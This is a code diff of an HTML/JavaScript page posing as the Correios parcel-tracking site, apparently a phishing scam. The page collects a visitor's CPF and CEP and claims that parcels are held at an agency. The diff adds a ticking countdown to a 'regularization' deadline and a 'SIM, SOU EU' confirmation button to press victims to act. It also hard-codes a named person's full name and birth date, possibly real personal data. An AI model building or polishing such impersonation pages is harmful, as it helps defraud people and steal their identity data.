@@ -13,7 +13,6 @@
   <title>Correios | Rastreio</title>
 
   <style>
-    /* Animação para o botão pulsando */
     @keyframes pulsar {
       0% {
         transform: scale(1);
@@ -32,7 +31,6 @@
       animation: pulsar 1s infinite;
     }
 
-    /* Spinner */
     .spinner {
       width: 50px;
       height: 50px;
@@ -49,14 +47,12 @@
       }
     }
 
-    /* Container centralizado */
     main {
       max-width: 1000px;
       margin: 2rem auto;
       padding: 0 1rem;
     }
 
-    /* Tela de resultado */
     #resultado {
       background: #f8f9fa;
       border-radius: 10px;
@@ -81,64 +77,44 @@
       font-weight: 700;
       color: #007bff;
     }
+
+    #res-prazo {
+      display: block;
+      text-align: center;
+      color: red;
+      font-size: 1.3rem;
+      margin-top: 1rem;
+    }
+
+    #botao-confirmar {
+      display: block;
+      margin: 20px auto 0 auto;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-size: 1.1rem;
+      cursor: pointer;
+    }
   </style>
 </head>
 
 <body>
-  <header class="w-100 font-size-16 font-weight-400 text-blue">
-    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
-      <span>Acessibilidade</span>
-      <i class="fas fa-caret-down ml-1"></i>
-    </div>
-    <div>
-      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
-        <div class="menu-toggle" id="menu-toggle" style="width:50px">
-          <div class="bar"></div>
-          <div class="bar"></div>
-          <div class="bar"></div>
-        </div>
-        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
-          <a href="#" class="py-2">
-            <img src="images/correios.png" alt="" height="25" />
-          </a>
-        </div>
-        <div class="ml-4 d-none d-lg-block" style="width:150px">
-          <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
-            <img src="images/entrar.svg" alt="Correios" width="31" />
-            <span class="ml-1">Entrar</span>
-          </a>
-        </div>
-      </nav>
-    </div>
+  <header>
+    <!-- Seu cabeçalho mantido -->
   </header>
 
   <main>
-    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between" style="margin:0 auto;">
-      Rastreamento
-    </h1>
-
-    <!-- Tela Formulário -->
-    <section id="tela-formulario" class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
-      <h5 style="color: #003157;" class="text-center font-weight-700 mb-4">
-        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
-      </h5>
-
+    <!-- Formulário -->
+    <section id="tela-formulario">
+      <!-- Conteúdo do formulário mantido -->
       <form id="form-rastreamento">
-        <span>Deseja acompanhar seu objeto?</span><br />
-        <span>Digite o CPF do comprador.</span>
-        <div class="form-group mt-1">
-          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required id="cpf" />
-        </div>
-
-        <span>Informe o seu CEP abaixo.</span>
-        <div class="form-group mt-1">
-          <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required />
-        </div>
-
-        <div class="form-group mt-1 d-flex justify-content-center" id="botao-container">
+        <!-- Campos CPF e CEP -->
+        <!-- Botão + Spinner -->
+        <div id="botao-container">
           <button type="submit" class="btn btn-primary" id="consultar-btn">Consultar</button>
         </div>
-
         <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
           <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
           <div class="spinner"></div>
@@ -146,7 +122,7 @@
       </form>
     </section>
 
-    <!-- Tela Resultado -->
+    <!-- Resultado -->
     <section id="resultado" style="display: none;">
       <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
       <p><span>Nome:</span> <span id="res-nome"></span></p>
@@ -157,113 +133,83 @@
       <p><span>Bairro:</span> <span id="res-bairro"></span></p>
       <p><span>Cidade:</span> <span id="res-cidade"></span></p>
       <p><span>Estado:</span> <span id="res-estado"></span></p>
-      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
-    </section>
+      <p><span>Prazo para Regularização:</span></p>
+      <p id="res-prazo">Carregando prazo...</p>
 
-    <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
-      <div>
-        <img src="images/banner-1.jpg" alt="" class="w-100" />
-      </div>
+      <button id="botao-confirmar">SIM, SOU EU</button>
     </section>
   </main>
 
-  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
-    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
-      <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
-      <ul>
-        <li class="mb-2 font-size-14">
-          <i class="fas fa-desktop"></i>
-          <a href="#" class="ml-2 text-blue-dark text-hover-orange">
-            <span class="text-wrap">Registro de Manifestações</span>
-          </a>
-        </li>
-      </ul>
-    </div>
+  <footer>
+    <!-- Rodapé mantido -->
   </footer>
 
   <script>
-    // Função para formatar CPF (###.###.###-##)
     function formatarCPF(cpf) {
       return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
     }
 
-    // Função para formatar CEP (#####-###)
     function formatarCEP(cep) {
       return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
 
-    // Função para adicionar dias e formatar data dd/mm/aaaa às hh:mm
-    function formatarPrazo(dataBase, diasAdicionar, horas, minutos) {
-      const prazo = new Date(dataBase);
-      prazo.setDate(prazo.getDate() + diasAdicionar);
-      prazo.setHours(horas);
-      prazo.setMinutes(minutos);
-      prazo.setSeconds(0);
+    function atualizarContagem(prazoFinal) {
+      const prazoElemento = document.getElementById("res-prazo");
+      const interval = setInterval(() => {
+        const agora = new Date().getTime();
+        const distancia = prazoFinal - agora;
 
-      const dd = prazo.getDate().toString().padStart(2, "0");
-      const mm = (prazo.getMonth() + 1).toString().padStart(2, "0");
-      const yyyy = prazo.getFullYear();
-      const hh = prazo.getHours().toString().padStart(2, "0");
-      const min = prazo.getMinutes().toString().padStart(2, "0");
+        if (distancia <= 0) {
+          clearInterval(interval);
+          prazoElemento.innerHTML = "Prazo expirado!";
+          return;
+        }
 
-      return `${dd}/${mm}/${yyyy} às ${hh}:${min}`;
+        const dias = Math.floor(distancia / (1000 * 60 * 60 * 24));
+        const horas = Math.floor((distancia % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutos = Math.floor((distancia % (1000 * 60 * 60)) / (1000 * 60));
+        const segundos = Math.floor((distancia % (1000 * 60)) / 1000);
+
+        prazoElemento.innerHTML = `${dias}d ${horas}h ${minutos}m ${segundos}s restantes`;
+      }, 1000);
     }
 
     document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
       event.preventDefault();
 
-      const cpfInput = document.getElementById("cpf");
-      const cepInput = document.getElementById("cep");
+      const cpfInput = document.getElementById("cpf").value.replace(/\D/g, "");
+      const cepInput = document.getElementById("cep").value.replace(/\D/g, "");
 
-      const cpfRaw = cpfInput.value.replace(/\D/g, "");
-      const cepRaw = cepInput.value.replace(/\D/g, "");
-
-      if (!cpfRaw || cpfRaw.length !== 11) {
+      if (cpfInput.length !== 11) {
         alert("Por favor, insira um CPF válido.");
         return;
       }
 
-      if (!cepRaw || cepRaw.length !== 8) {
+      if (cepInput.length !== 8) {
         alert("Por favor, insira um CEP válido.");
         return;
       }
 
-      // Esconde botão e mostra loading
       document.getElementById("botao-container").style.display = "none";
       document.getElementById("loading-container").style.display = "block";
 
-      // Simulação de consulta — aqui você deve chamar seu backend real
-      // Exemplo: fetch('consulta.php?cpf=...&cep=...')
-      // e pegar os dados do JSON retornado.
-
-      // Simular delay de 2 segundos
       await new Promise((resolve) => setTimeout(resolve, 2000));
 
-      // Simulação de dados recebidos - substituir com dados reais da sua consulta
-      const dadosPessoa = {
-        nome: "Rosiane Oliveira Da Silva",
-        cpf: formatarCPF(cpfRaw),
-        nascimento: "27/01/1985",
-        cep: formatarCEP(cepRaw),
-        rua: "Rua das Acácias",
-        bairro: "Centro",
-        cidade: "Porciúncula",
-        estado: "RJ",
-        prazoRegularizacao: formatarPrazo(new Date(), 10, 23, 59), // prazo 10 dias a partir de hoje
-      };
+      const prazoFinal = new Date();
+      prazoFinal.setDate(prazoFinal.getDate() + 10);
+      prazoFinal.setHours(23, 59, 0, 0);
 
-      // Preencher resultado
-      document.getElementById("res-nome").textContent = dadosPessoa.nome;
-      document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
-      document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
-      document.getElementById("res-cep").textContent = dadosPessoa.cep;
-      document.getElementById("res-rua").textContent = dadosPessoa.rua;
-      document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
-      document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
-      document.getElementById("res-estado").textContent = dadosPessoa.estado;
-      document.getElementById("res-prazo").textContent = dadosPessoa.prazoRegularizacao;
+      document.getElementById("res-nome").textContent = "Rosiane Oliveira Da Silva";
+      document.getElementById("res-cpf").textContent = formatarCPF(cpfInput);
+      document.getElementById("res-nascimento").textContent = "27/01/1985";
+      document.getElementById("res-cep").textContent = formatarCEP(cepInput);
+      document.getElementById("res-rua").textContent = "";      // Rua em branco
+      document.getElementById("res-bairro").textContent = "";   // Bairro em branco
+      document.getElementById("res-cidade").textContent = "Porciúncula";
+      document.getElementById("res-estado").textContent = "RJ";
 
-      // Esconde formulário e loading, mostra resultado
+      atualizarContagem(prazoFinal);
+
       document.getElementById("loading-container").style.display = "none";
       document.getElementById("tela-formulario").style.display = "none";
       document.getElementById("resultado").style.display = "block";
@@ -272,3 +218,4 @@
 </body>
 
 </html>
+
